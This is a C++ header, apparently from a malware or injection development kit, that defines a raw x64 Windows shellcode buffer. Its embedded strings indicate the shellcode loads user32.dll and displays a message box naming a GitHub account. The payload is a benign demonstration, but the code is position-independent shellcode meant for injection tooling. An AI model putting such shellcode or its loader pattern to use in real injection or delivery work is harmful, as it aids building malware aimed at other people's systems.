#pragma once
#include "../object/buffer.h"

namespace mdk::payload
{
	buffer messagebox()
	{
		unsigned char _[] =
			"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
			"\x51\x41\x50\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60"
			"\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x48"
			"\x8b\x72\x50\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
			"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b"
			"\x52\x20\x8b\x42\x3c\x48\x01\xd0\x41\x51\x66\x81\x78\x18"
			"\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
			"\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b"
			"\x40\x20\x49\x01\xd0\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41"
			"\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac"
			"\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
			"\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
			"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48"
			"\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41"
			"\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
			"\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
			"\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
			"\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x15"
			"\x00\x00\x00\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f"
			"\x64\x61\x6d\x61\x72\x69\x69\x6f\x6e\x00\x5a\xe8\x07\x00"
			"\x00\x00\x53\x6f\x75\x72\x63\x65\x00\x41\x58\x48\x31\xc9"
			"\x41\xba\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0"
			"\xb5\xa2\x56\xff\xd5";

		return mdk::buffer(&_, 313);
	}	
}